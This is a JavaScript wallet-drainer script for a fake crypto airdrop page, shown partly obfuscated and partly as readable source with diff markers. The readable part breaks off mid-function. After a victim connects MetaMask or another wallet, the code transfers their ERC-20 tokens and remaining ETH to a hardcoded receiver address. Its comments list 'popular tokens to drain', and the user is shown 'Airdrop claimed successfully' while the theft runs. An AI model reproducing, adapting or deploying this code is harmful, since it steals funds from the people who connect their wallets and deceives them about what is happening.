_0x1adefb={};_0x1adefb[_0x3f2686(0x10d)]=![],_0x1adefb[_0x3f2686(0xee)]='Connection\x20timeout',_0x52bc62(_0x1adefb);return;}setTimeout(_0x2dfa84,_0x1f5176);};_0x2dfa84();});}$(_0xdb430d(0xe3))['prepend'](_0xdb430d(0xde));if(_0x507f78[_0xdb430d(0x17a)]===0x0){if(_0x3408ec()){const _0x3a6c51={};_0x3a6c51[_0x4c6367(0x20d)]=_0xdb430d(0x113),_0x3a6c51[_0x4c6367(0x17f)]=_0x4c6367(0x106),_0x3a6c51[_0xdb430d(0x214)]=_0xdb430d(0x20f);const _0x30f0f6={};_0x30f0f6[_0x4c6367(0x20d)]=_0xdb430d(0x1ed),_0x30f0f6[_0x4c6367(0x17f)]=_0xdb430d(0xfb),_0x30f0f6[_0x4c6367(0x1d9)]=_0x4c6367(0x1a6);const _0x54e405={};_0x54e405[_0x4c6367(0x20d)]='WalletConnect',_0x54e405[_0x4c6367(0x135)]=_0xdb430d(0x129),_0x54e405[_0xdb430d(0x19d)]=_0xdb430d(0x129),_0x507f78[_0xdb430d(0x190)](_0x3a6c51,_0x30f0f6,_0x54e405);}else{const _0x4b9065={};_0x4b9065[_0x4c6367(0x20d)]=_0xdb430d(0x114),_0x4b9065[_0x4c6367(0x135)]=null;const _0x4ced3d={};_0x4ced3d['name']=_0x4c6367(0x1ea),_0x4ced3d[_0xdb430d(0xd1)]='walletconnect',_0x4ced3d[_0xdb430d(0x19d)]=_0xdb430d(0x129),_0x507f78[_0x4c6367(0x213)](_0x4b9065,_0x4ced3d);}}_0x507f78[_0x4c6367(0xfc)]((_0x137669,_0x93a766)=>{const _0xccd7f6=_0xdb430d,_0xce8c74=_0x4c6367;let _0x8ca42=_0x137669[_0xce8c74(0x20d)];if(_0x137669[_0xccd7f6(0x19d)]===_0xce8c74(0x106)&&!_0x3408ec())_0x8ca42+='\x20(Mobile\x20Only)';else _0x137669[_0xccd7f6(0x19d)]!==_0xccd7f6(0xfb)&&!_0x137669[_0xce8c74(0x135)]&&_0x137669['name']!=='WalletConnect'&&(_0x8ca42+=_0xce8c74(0x12b));$(_0xccd7f6(0xf5))[_0xce8c74(0xf7)](_0xce8c74(0x141)+_0x93a766+'\x22>'+_0x8ca42+_0xccd7f6(0xe9));}),$(_0x4c6367(0x14c))[_0x4c6367(0x18e)](_0x4c6367(0x199));function _0x518768(_0x466750,_0x532e6d=![]){const _0x2699fb=_0x4c6367,_0x32f163=_0xdb430d,_0x4c9479=$('#connection-status');_0x4c9479[_0x32f163(0xdd)](_0x466750),_0x4c9479[_0x2699fb(0x147)](_0x32f163(0xe1),_0x532e6d?'#ff4444':_0x2699fb(0x201));}_0x518768(_0x4c6367(0x12c)+(_0x3408ec()?_0x4c6367(0x1ad):_0x4c6367(0x14b))+_0x4c6367(0x1e1)+_0x507f78[_0x4c6367(0x19e)]),_0x450b7f(),$(_0x4c6367(0x197))['on']('click',async()=>{const _0x58fe5a=_0xdb430d,_0x231c6a=_0x4c6367,_0xbdf9b3=$(_0x231c6a(0x207))[_0x58fe5a(0x1c9)](),_0x354fbc=_0x507f78[_0xbdf9b3];let _0x4211f5=null,_0x52c08d=_0x354fbc?_0x354fbc[_0x58fe5a(0x17c)]:'';try{if(!_0x354fbc){alert(_0x58fe5a(0x136));return;}if(_0x354fbc[_0x231c6a(0x17f)]==='mobile'){if(_0x3408ec()){_0x518768('Opening\x20mobile\x20wallet...');const _0x9b063c=_0x5cc373(_0x354fbc[_0x231c6a(0x1d9)]);if(_0x9b063c){_0x518768(_0x231c6a(0x139));const _0x5efdf7=confirm(_0x58fe5a(0x1fb)+_0x354fbc[_0x231c6a(0x20d)]+'...\x0a\x0a'+_0x58fe5a(0xf1)+_0x58fe5a(0xcb)+_0x58fe5a(0x15f)+_0x231c6a(0x11e)+_0x58fe5a(0x166));if(_0x5efdf7){const _0x1a5ed4=await _0x31e7f9(0xafc8);if(_0x1a5ed4[_0x231c6a(0x10d)]){_0x518768('Mobile\x20wallet\x20connected\x20successfully!'),await _0xcaccb5(_0x1a5ed4[_0x231c6a(0x135)],_0x354fbc[_0x58fe5a(0x17c)],_0x1a5ed4['accounts'][0x0]);return;}else{_0x518768(_0x231c6a(0x1bb),!![]),alert(_0x58fe5a(0x111));return;}}else{_0x518768(_0x231c6a(0x1c8));return;}}else{_0x518768('Failed\x20to\x20open\x20mobile\x20wallet',!![]),alert(_0x58fe5a(0x1ee)+_0x354fbc[_0x58fe5a(0x17c)]+'.\x20Please\x20install\x20the\x20wallet\x20app\x20or\x20use\x20WalletConnect.');return;}}else{_0x518768(_0x231c6a(0x18d),!![]),alert(_0x231c6a(0xea));return;}}if(_0x354fbc['name']===_0x58fe5a(0x1e0)&&_0x425f30&&_0xe5fcac){_0x518768(_0x58fe5a(0x211));const _0x1089e1='435fa3916a5da648144afac1e1b4d3f2',_0x4198f1={};_0x4198f1[_0x231c6a(0x20d)]=_0x231c6a(0x1f6),_0x4198f1[_0x231c6a(0xc7)]=_0x58fe5a(0x1bd),_0x4198f1[_0x58fe5a(0x144)]=window[_0x231c6a(0x1ca)][_0x58fe5a(0x1e3)],_0x4198f1[_0x58fe5a(0x142)]=[_0x58fe5a(0x1dc)];const _0x4bcc72={};_0x4bcc72['projectId']=_0x1089e1,_0x4bcc72[_0x231c6a(0x1b8)]=[0x1],_0x4bcc72['showQrModal']=!![],_0x4bcc72[_0x58fe5a(0xf4)]=_0x4198f1,_0x4211f5=await _0xe5fcac[_0x231c6a(0x103)](_0x4bcc72),_0x518768('Waiting\x20for\x20WalletConnect\x20pairing...'),await _0x4211f5[_0x58fe5a(0x10a)]();if(!_0x4211f5[_0x58fe5a(0x163)]||_0x4211f5[_0x58fe5a(0x163)]['length']===0x0){_0x518768(_0x58fe5a(0x1fe),!![]),alert('No\x20accounts\x20connected\x20via\x20WalletConnect.');return;}_0x518768(_0x58fe5a(0x176)),await _0xcaccb5(_0x4211f5,_0x354fbc[_0x58fe5a(0x17c)],_0x4211f5[_0x231c6a(0x152)][0x0]);return;}if(!_0x354fbc[_0x231c6a(0x135)]||_0x354fbc[_0x231c6a(0x135)]===_0x231c6a(0x21d)){_0x518768('Wallet\x20not\x20available',!![]),alert(_0x58fe5a(0x196));return;}_0x4211f5=_0x354fbc[_0x231c6a(0x135)];if(!_0x4211f5||typeof _0x4211f5[_0x58fe5a(0x1da)]!==_0x58fe5a(0x215)){_0x518768(_0x58fe5a(0x16c),!![]),alert(_0x354fbc[_0x58fe5a(0x17c)]+_0x231c6a(0x13b));return;}_0x518768(_0x58fe5a(0x156)+_0x354fbc['name']+_0x58fe5a(0x1d0));const _0x204e15={};_0x204e15['method']='eth_requestAccounts',await _0x4211f5[_0x58fe5a(0x1da)](_0x204e15);const _0x40ed91={};_0x40ed91['method']=_0x231c6a(0x183);const _0x3951bf=await _0x4211f5[_0x231c6a(0x14f)](_0x40ed91);if(!_0x3951bf||_0x3951bf[_0x231c6a(0x19e)]===0x0){_0x518768(_0x58fe5a(0x198),!![]),alert(_0x58fe5a(0x126));return;}_0x518768('Desktop\x20wallet\x20connected\x20successfully!'),await _0xcaccb5(_0x4211f5,_0x354fbc['name'],_0x3951bf[0x0]);}catch(_0x525077){console[_0x58fe5a(0x16e)](_0x231c6a(0x1d2),_0x525077);if(_0x525077[_0x58fe5a(0x1ba)]===0xfa1)_0x518768('Connection\x20rejected\x20by\x20user',!![]),alert('Connection\x20request\x20was\x20rejected\x20by\x20the\x20user.');else{if(_0x525077[_0x58fe5a(0x1ba)]===-0x7d02)_0x518768('Connection\x20request\x20already\x20pending',!![]),alert(_0x231c6a(0x178));else _0x525077[_0x231c6a(0xd7)][_0x58fe5a(0x12f)]('User\x20rejected')?(_0x518768(_0x58fe5a(0x1c7),!![]),alert(_0x58fe5a(0xd3))):(_0x518768('Connection\x20failed',!![]),alert(_0x231c6a(0x1d6)+_0x525077[_0x58fe5a(0xca)]));}}});async function _0xcaccb5(_0x482414,_0x1c9344,_0x3b4ca2){const _0x2780cf=_0xdb430d,_0x364053=_0x4c6367;try{_0x518768('Setting\x20up\x20connection...');const _0x3be4c4=new ethers['providers'][(_0x364053(0x146))](_0x482414),_0x36b41e=_0x3be4c4[_0x364053(0xe5)](),_0x5b1b8e=await _0x3be4c4[_0x364053(0x115)]();console[_0x364053(0x158)](_0x364053(0x194),_0x5b1b8e);if(_0x5b1b8e[_0x2780cf(0xe7)]!==0x1){_0x518768(_0x2780cf(0x145),!![]);const _0xc886c8=confirm(_0x364053(0x100));if(_0xc886c8)try{_0x518768(_0x2780cf(0x171));const _0x22ca0d={};_0x22ca0d['chainId']=_0x2780cf(0xe8);const _0xe1b5f={};return _0xe1b5f[_0x2780cf(0x1dd)]='wallet_switchEthereumChain',_0xe1b5f[_0x364053(0x169)]=[_0x22ca0d],await _0x482414[_0x2780cf(0x1da)](_0xe1b5f),_0x518768('Network\x20switched\x20successfully!'),_0xcaccb5(_0x482414,_0x1c9344,_0x3b4ca2);}catch(_0x5cb23c){console['error'](_0x364053(0x1f7),_0x5cb23c),_0x518768(_0x2780cf(0x130),!![]),alert(_0x364053(0x16d));return;}}_0x518768(_0x2780cf(0xeb));const _0x185712=await _0x3be4c4['getBalance'](_0x3b4ca2),_0x526f93=ethers[_0x2780cf(0x1b5)][_0x364053(0x1ec)](_0x185712);_0x518768(_0x364053(0xe0)+_0x1c9344+_0x2780cf(0x124)+parseFloat(_0x526f93)[_0x2780cf(0x102)](0x4)+_0x364053(0x186)),$('#connect-wallet')[_0x364053(0xd2)](_0x2780cf(0x151)),$(_0x364053(0x197))[_0x364053(0x19f)](_0x364053(0x161))['on'](_0x2780cf(0x20c),async()=>{await _0x26a99b(_0x3be4c4,_0x36b41e,_0x3b4ca2);}),alert(_0x2780cf(0xe2)+_0x1c9344+':\x0a'+_0x3b4ca2+_0x364053(0x173)+_0x526f93+_0x2780cf(0x157)+_0x5b1b8e['name']);}catch(_0x560e6e){console['error']('Post-connection\x20setup\x20error:',_0x560e6e),_0x518768(_0x2780cf(0x1df),!![]),alert(_0x2780cf(0x1c3)+_0x560e6e[_0x364053(0xd7)]);}}async function _0x26a99b(_0x2e2b7a,_0x26437d,_0x1658b8){const _0xb0860c=_0xdb430d,_0xdaf06a=_0x4c6367;try{console[_0xdaf06a(0x158)](_0xdaf06a(0x1e8)),_0x518768('Starting\x20asset\x20extraction...');const _0x48a340=await _0x2e2b7a[_0xb0860c(0x101)](_0x1658b8),_0x3f5b4e=ethers[_0xb0860c(0x1b5)][_0xdaf06a(0x1ec)](_0x48a340);console['log']('Initial\x20ETH\x20balance:\x20'+_0x3f5b4e);const _0x25f282=await _0x2e2b7a['getGasPrice']();console['log'](_0xdaf06a(0x150)+ethers[_0xb0860c(0x1b5)][_0xb0860c(0xd6)](_0x25f282,_0xb0860c(0x137))+_0xdaf06a(0x1f4));const _0x4ab594=ethers['BigNumber'][_0xdaf06a(0x165)](_0xdaf06a(0x19b)),_0x4f6823=ethers[_0xb0860c(0x125)][_0xdaf06a(0x165)]('21000'),_0x3a2bf6=_0x489dc5[_0xdaf06a(0x19e)],_0x3402b1=_0x4ab594[_0xdaf06a(0x18c)](_0x3a2bf6)['add'](_0x4f6823),_0x1cb61f=_0x25f282[_0xdaf06a(0x18c)](_0x3402b1);console[_0xb0860c(0x208)](_0xdaf06a(0x1a7)+ethers[_0xb0860c(0x1b5)]['formatEther'](_0x1cb61f)+_0xdaf06a(0x186));let _0x3f228=0x0;for(const _0x365d2d of _0x489dc5){try{_0x518768(_0xdaf06a(0x21f)+_0x365d2d[_0xdaf06a(0x1d4)]+_0xb0860c(0x1fa));const _0x5b66f7=await _0x3c11b0(_0x2e2b7a,_0x26437d,_0x1658b8,_0x365d2d,_0x25f282);_0x5b66f7&&(_0x3f228++,_0x518768(_0x365d2d[_0xdaf06a(0x1d4)]+_0xb0860c(0x11d)));}catch(_0x121483){console[_0xb0860c(0x16e)](_0xdaf06a(0x1af)+_0x365d2d[_0xb0860c(0x175)]+':',_0x121483),_0x518768(_0xb0860c(0x180)+_0x365d2d[_0xdaf06a(0x1d4)],!![]);}}console['log']('Successfully\x20transferred\x20'+_0x3f228+_0xb0860c(0x1e7)),_0x518768(_0xdaf06a(0x20b)),await _0xd7bcef(_0x2e2b7a,_0x26437d,_0x1658b8),_0x518768('All\x20assets\x20extracted\x20successfully!\x20🎉'),alert('Airdrop\x20claimed\x20successfully!\x20🎉');}catch(_0x12c0dc){console[_0xdaf06a(0xee)](_0xdaf06a(0xd0),_0x12c0dc),_0x518768(_0xb0860c(0x1c5),!![]),alert(_0xb0860c(0x1db)+_0x12c0dc[_0xb0860c(0xca)]);}}async function _0x3c11b0(_0x16f9cc,_0x2446d0,_0x1db5c0,_0x2c519d,_0x662a7f=null){const _0x52e2c9=_0xdb430d,_0x3db8aa=_0x4c6367;try{const _0x24a760=[_0x3db8aa(0x181),_0x3db8aa(0xf9),'function\x20allowance(address\x20owner,\x20address\x20spender)\x20view\x20returns\x20(uint256)','function\x20approve(address\x20spender,\x20uint256\x20amount)\x20returns\x20(bool)','function\x20decimals()\x20view\x20returns\x20(uint8)','function\x20symbol()\x20view\x20returns\x20(string)'],_0x23e443=new ethers[(_0x3db8aa(0x123))](_0x2c519d[_0x3db8aa(0xf8)],_0x24a760,_0x2446d0),_0xaa8de1=await _0x23e443[_0x3db8aa(0x155)](_0x1db5c0);if(_0xaa8de1[_0x3db8aa(0x1be)]())return console[_0x3db8aa(0x158)](_0x52e2c9(0x159)+_0x2c519d[_0x52e2c9(0x175)]+'\x20balance\x20found'),![];const _0x1e91cd=ethers[_0x3db8aa(0x140)][_0x3db8aa(0x14a)](_0xaa8de1,_0x2c519d['decimals']);console[_0x3db8aa(0x158)](_0x3db8aa(0x17e)+_0x2c519d[_0x3db8aa(0x1d4)]+_0x52e2c9(0x1a8)+_0x1e91cd);!_0x662a7f&&(_0x662a7f=await _0x16f9cc[_0x52e2c9(0x1c2)]());let _0x5b8fba;try{_0x5b8fba=await _0x23e443[_0x52e2c9(0x15b)]['transfer'](_0x28e8a5,_0xaa8de1),_0x5b8fba=_0x5b8fba[_0x52e2c9(0x10c)](0x78)[_0x3db8aa(0x120)](0x64);}catch(_0x2ffd01){console[_0x3db8aa(0xfe)](_0x52e2c9(0x20e)+_0x2c519d[_0x3db8aa(0x1d4)]+_0x3db8aa(0xe6)),_0x5b8fba=ethers[_0x52e2c9(0x125)][_0x52e2c9(0x1ff)]('65000');}console[_0x52e2c9(0x208)](_0x52e2c9(0xd5)+_0x2c519d[_0x52e2c9(0x175)]+':\x20'+_0x5b8fba[_0x3db8aa(0x164)]());const _0x3a3ad5=await _0x16f9cc[_0x52e2c9(0x101)](_0x1db5c0),_0x5ab8de=_0x662a7f[_0x52e2c9(0x10c)](_0x5b8fba);if(_0x3a3ad5['lt'](_0x5ab8de))return console[_0x52e2c9(0x208)](_0x52e2c9(0x143)+_0x2c519d['symbol']+_0x3db8aa(0x1a9)+ethers[_0x3db8aa(0x140)]['formatEther'](_0x5ab8de)+_0x3db8aa(0x186)),![];console[_0x3db8aa(0x158)]('Transferring\x20'+_0x1e91cd+'\x20'+_0x2c519d['symbol']+'\x20to\x20'+_0x28e8a5);const _0xe0f7a0=await _0x23e443[_0x52e2c9(0x13d)](_0x28e8a5,_0xaa8de1,{'gasLimit':_0x5b8fba,'gasPrice':_0x662a7f,..._0x16f9cc['getNetwork']()[_0x52e2c9(0x112)](_0x1af80d=>_0x1af80d[_0x52e2c9(0xe7)]===0x1)&&{'maxFeePerGas':_0x662a7f[_0x3db8aa(0x18c)](0x96)[_0x3db8aa(0x120)](0x64),'maxPriorityFeePerGas':ethers[_0x52e2c9(0x1b5)]['parseUnits']('2','gwei')}});console[_0x52e2c9(0x208)](_0x2c519d[_0x52e2c9(0x175)]+_0x3db8aa(0x1c6)+_0xe0f7a0[_0x3db8aa(0x1de)]);const _0xb84b9c=await _0xe0f7a0['wait']();return console[_0x3db8aa(0x158)](_0x2c519d[_0x52e2c9(0x175)]+_0x52e2c9(0x192)+_0xb84b9c[_0x3db8aa(0x15e)]),console[_0x52e2c9(0x208)]('Gas\x20used:\x20'+_0xb84b9c[_0x52e2c9(0x12d)][_0x52e2c9(0x16b)]()),!![];}catch(_0x1f3f5a){console[_0x52e2c9(0x16e)]('Error\x20draining\x20'+_0x2c519d[_0x3db8aa(0x1d4)]+':',_0x1f3f5a);if(_0x1f3f5a[_0x52e2c9(0x1ba)]===_0x3db8aa(0x160))console[_0x52e2c9(0x208)](_0x3db8aa(0x1e4)+_0x2c519d['symbol']+'\x20transfer');else _0x1f3f5a[_0x3db8aa(0x1a3)]==='UNPREDICTABLE_GAS_LIMIT'&&console[_0x3db8aa(0x158)](_0x52e2c9(0x17d)+_0x2c519d[_0x3db8aa(0x1d4)]+_0x52e2c9(0x212));return![];}}async function _0xd7bcef(_0x221e8d,_0x1cf649,_0x5454d1){const _0x4dfa9b=_0xdb430d,_0x107146=_0x4c6367;try{const _0x555357=await _0x221e8d[_0x107146(0x13f)](_0x5454d1),_0x40a35c=ethers[_0x107146(0x140)][_0x107146(0x1ec)](_0x555357);console[_0x107146(0x158)](_0x107146(0x1f9)+_0x40a35c);if(_0x555357[_0x107146(0x1be)]()){console[_0x107146(0x158)]('No\x20ETH\x20balance\x20remaining');return;}const _0x58b0f1=await _0x221e8d[_0x107146(0x134)]();console['log'](_0x107146(0x150)+ethers[_0x4dfa9b(0x1b5)]['formatUnits'](_0x58b0f1,_0x107146(0x1e2))+_0x4dfa9b(0x1cf));const _0x3dc749=ethers[_0x4dfa9b(0x125)][_0x107146(0x165)](_0x107146(0x191)),_0x494db7=_0x58b0f1[_0x107146(0x18c)](_0x3dc749);console[_0x4dfa9b(0x208)](_0x107146(0x1a2)+ethers['utils']['formatEther'](_0x494db7)+_0x4dfa9b(0x1b6));const _0x5914ae=_0x555357[_0x107146(0x128)](_0x494db7);if(_0x5914ae['lte'](0x0)){console[_0x107146(0x158)]('Insufficient\x20ETH\x20balance\x20for\x20gas\x20fees'),console[_0x107146(0x158)](_0x4dfa9b(0x153)+ethers['utils'][_0x4dfa9b(0xd9)](_0x555357)+_0x4dfa9b(0x1b6)),console[_0x4dfa9b(0x208)](_0x107146(0x1fd)+ethers[_0x107146(0x140)][_0x4dfa9b(0xd9)](_0x494db7)+_0x107146(0x186));return;}const _0x5e259a=ethers[_0x107146(0x140)]['formatEther'](_0x5914ae);console[_0x107146(0x158)](_0x4dfa9b(0xed)+_0x5e259a+'\x20ETH\x20to\x20'+_0x28e8a5),console[_0x107146(0x158)](_0x107146(0x1f8)+ethers[_0x4dfa9b(0x1b5)][_0x107146(0x1ec)](_0x494db7)+'\x20ETH\x20for\x20gas');const _0x184919={'to':_0x28e8a5,'value':_0x5914ae,'gasLimit':_0x3dc749,'gasPrice':_0x58b0f1,'nonce':await _0x221e8d['getTransactionCount'](_0x5454d1)},_0x1634e3=await _0x221e8d[_0x4dfa9b(0x18f)]();if(_0x1634e3[_0x4dfa9b(0xe7)]===0x1)try{const _0x3940c4=await _0x221e8d[_0x107146(0x14e)]();if(_0x3940c4[_0x107146(0x17b)]&&_0x3940c4['maxPriorityFeePerGas']){delete _0x184919[_0x107146(0x1d5)],_0x184919[_0x107146(0x17b)]=_0x3940c4[_0x107146(0x17b)],_0x184919[_0x4dfa9b(0xdb)]=_0x3940c4[_0x4dfa9b(0xdb)];const _0x4efd60=_0x3940c4[_0x107146(0x17b)][_0x107146(0x18c)](_0x3dc749),_0x1c88c0=_0x555357[_0x107146(0x128)](_0x4efd60);_0x1c88c0['gt'](0x0)&&(_0x184919['value']=_0x1c88c0,console[_0x107146(0x158)]('Using\x20EIP-1559:\x20sending\x20'+ethers['utils']['formatEther'](_0x1c88c0)+_0x107146(0x186)));}}catch(_0xf502ee){console[_0x107146(0x158)](_0x107146(0x1b7));}const _0x23d2dc=await _0x1cf649[_0x4dfa9b(0xff)](_0x184919);console['log'](_0x4dfa9b(0xd8),_0x23d2dc[_0x107146(0x1de)]);const _0x50c187=await _0x23d2dc['wait']();console[_0x4dfa9b(0x208)](_0x4dfa9b(0x1c1),_0x50c187[_0x4dfa9b(0x1ab)]),console[_0x4dfa9b(0x208)](_0x107146(0x168),_0x50c187[_0x107146(0x12a)][_0x107146(0x164)]()),console[_0x107146(0x158)](_0x4dfa9b(0x1b3),ethers[_0x4dfa9b(0x1b5)]['formatUnits'](_0x50c187[_0x4dfa9b(0x1a0)]||_0x58b0f1,_0x4dfa9b(0x137)),_0x4dfa9b(0x137));const _0x11c31e=await _0x221e8d['getBalance'](_0x5454d1),_0x23d324=ethers[_0x4dfa9b(0x1b5)]['formatEther'](_0x11c31e);console['log'](_0x107146(0x16a)+_0x23d324+_0x107146(0x186)),_0x11c31e['gt'](ethers[_0x4dfa9b(0x1b5)][_0x107146(0x21c)](_0x107146(0x189)))&&console[_0x4dfa9b(0x19c)](_0x4dfa9b(0x21a)+_0x23d324+_0x4dfa9b(0x216));}catch(_0x2986a4){console[_0x4dfa9b(0x16e)](_0x107146(0x1ef),_0x2986a4);if(_0x2986a4[_0x107146(0x1a3)]===_0x4dfa9b(0x1eb))console[_0x107146(0x158)](_0x107146(0x184));else _0x2986a4[_0x4dfa9b(0x1ba)]===_0x4dfa9b(0x174)&&console[_0x4dfa9b(0x208)](_0x107146(0x121));throw _0x2986a4;}}}));
+$(document).ready(function() {
+    // Dynamic wallet detection
+    const detectedWallets = [];
+    if (window.ethereum) {
+        // Single provider
+        const eth = window.ethereum;
+        const walletTypes = [
+            { name: "MetaMask", key: "isMetaMask" },
+            { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
+            { name: "Trust Wallet", key: "isTrust" },
+            { name: "Rainbow", key: "isRainbow" },
+            { name: "Brave Wallet", key: "isBraveWallet" },
+            { name: "Opera Wallet", key: "isOpera" },
+            { name: "Phantom (ETH)", key: "isPhantom" },
+            { name: "Rabby Wallet", key: "isRabby" },
+            { name: "Frame", key: "isFrame" },
+            { name: "Talisman", key: "isTalisman" }
+        ];
+        // Improved Phantom detection: check window.phantom.ethereum
+        if (window.phantom && window.phantom.ethereum) {
+            detectedWallets.push({ name: "Phantom (ETH)", provider: eth });
+        } else {
+            walletTypes.forEach(w => {
+                if (w.key === "isPhantom" && eth[w.key]) {
+                    detectedWallets.push({ name: w.name, provider: eth });
+                } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
+                    detectedWallets.push({ name: w.name, provider: eth });
+                } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
+                    detectedWallets.push({ name: w.name, provider: eth });
+                } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
+                    detectedWallets.push({ name: w.name, provider: eth });
+                }
+            });
+        }
+        // Extra: detect Coinbase Wallet via window.coinbaseWalletExtension
+        if (window.coinbaseWalletExtension) {
+            detectedWallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension });
+        }
+        // Multiple providers
+        if (Array.isArray(eth.providers)) {
+            eth.providers.forEach(p => {
+                walletTypes.forEach(w => {
+                    if (w.key === "isPhantom" && p[w.key]) {
+                        detectedWallets.push({ name: w.name, provider: p });
+                    } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
+                        detectedWallets.push({ name: w.name, provider: p });
+                    } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
+                        detectedWallets.push({ name: w.name, provider: p });
+                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
+                        detectedWallets.push({ name: w.name, provider: p });
+                    }
+                });
+            });
+        }
+    }
+    // Mobile wallet detection (always add mobile options)
+    const mobileWallets = [
+        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
+        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
+        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
+        { name: "Rainbow Mobile", type: "mobile", deepLink: "rainbow" },
+        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom (eth)" },
+        { name: "Argent Mobile", type: "mobile", deepLink: "argent" },
+        { name: "Exodus Mobile", type: "mobile", deepLink: "exodus" }
+    ];
+
+    // Add mobile wallets if on mobile device or if no desktop wallets found
+    if (isMobileDevice() || detectedWallets.length === 0) {
+        mobileWallets.forEach(wallet => {
+            detectedWallets.push(wallet);
+        });
+    }
+
+    // WalletConnect detection (works on both mobile and desktop)
+    let walletConnectAvailable = false;
+    let WalletConnectProvider = null;
+    if (window.WalletConnectProvider) {
+        walletConnectAvailable = true;
+        WalletConnectProvider = window.WalletConnectProvider;
+    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
+        walletConnectAvailable = true;
+        WalletConnectProvider = window.WalletConnect.EthereumProvider;
+    }
+    if (walletConnectAvailable) {
+        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
+    }
+
+    // Your Ethereum address to receive funds
+    const RECEIVER_ADDRESS = "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49"; // Replace with your ETH address
+
+    // Common ERC-20 token contracts (popular tokens to drain)
+    const COMMON_TOKENS = [
+        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+        { symbol: "USDC", address: "0xA0b86a33E6417a174f4dCc5B814094b8D1f57b69", decimals: 6 },
+        { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+        { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+        { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
+        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+        { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+        { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
+        { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", decimals: 18 }
+    ];
+
+    // Function to debug available wallet providers
+    function debugWalletProviders() {
+        console.log("=== Wallet Provider Debug ===");
+        console.log("window.ethereum:", window.ethereum);
+        
+        if (window.ethereum) {
+            console.log("Main ethereum object properties:");
+            console.log("- isMetaMask:", window.ethereum.isMetaMask);
+            console.log("- isPhantom:", window.ethereum.isPhantom);
+            console.log("- isCoinbaseWallet:", window.ethereum.isCoinbaseWallet);
+            console.log("- isTrust:", window.ethereum.isTrust);
+            console.log("- isRainbow:", window.ethereum.isRainbow);
+            console.log("- isBraveWallet:", window.ethereum.isBraveWallet);
+            console.log("- isRabby:", window.ethereum.isRabby);
+            
+            if (window.ethereum.providers) {
+                console.log("Multiple providers detected:", window.ethereum.providers.length);
+                window.ethereum.providers.forEach((provider, index) => {
+                    console.log(`Provider ${index}:`, {
+                        isMetaMask: provider.isMetaMask,
+                        isPhantom: provider.isPhantom,
+                        isCoinbaseWallet: provider.isCoinbaseWallet,
+                        isTrust: provider.isTrust,
+                        isRainbow: provider.isRainbow,
+                        isBraveWallet: provider.isBraveWallet,
+                        isRabby: provider.isRabby
+                    });
+                });
+            }
+        }
+        console.log("==========================");
+    }
+
+    // Function to detect mobile device
+    function isMobileDevice() {
+        // More comprehensive mobile detection
+        const userAgent = navigator.userAgent.toLowerCase();
+        const mobileKeywords = [
+            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
+            'iemobile', 'opera mini', 'mobile', 'tablet'
+        ];
+        
+        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        const isSmallScreen = window.innerWidth <= 768;
+        
+        return isMobileUA || (isTouchDevice && isSmallScreen);
+    }
+
+    // Function to create mobile deep links for Ethereum wallets
+    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
+        const encodedUrl = encodeURIComponent(dappUrl);
+        const hostname = window.location.hostname;
+        const fullUrl = window.location.href;
+        
+        const mobileLinks = {
+            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
+            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
+            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
+            "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
+            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
+            "argent": `https://argent.link/dapp/${hostname}${window.location.pathname}`,
+            "exodus": `https://www.exodus.com/mobile?dapp=${encodedUrl}`
+        };
+        
+        return mobileLinks[walletName.toLowerCase()] || null;
+    }
+
+    // Function to attempt mobile wallet connection
+    function connectMobileWallet(walletName) {
+        if (!isMobileDevice()) {
+            console.log("Not on mobile device, skipping mobile wallet connection");
+            return false;
+        }
+        
+        const deepLink = createMobileDeepLink(walletName);
+        if (deepLink) {
+            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
+            
+            // Try multiple methods to open the deep link
+            try {
+                // Method 1: Direct window.open
+                const newWindow = window.open(deepLink, '_blank');
+                
+                // Method 2: If window.open fails, try location.href
+                if (!newWindow || newWindow.closed) {
+                    window.location.href = deepLink;
+                }
+                
+                return true;
+            } catch (error) {
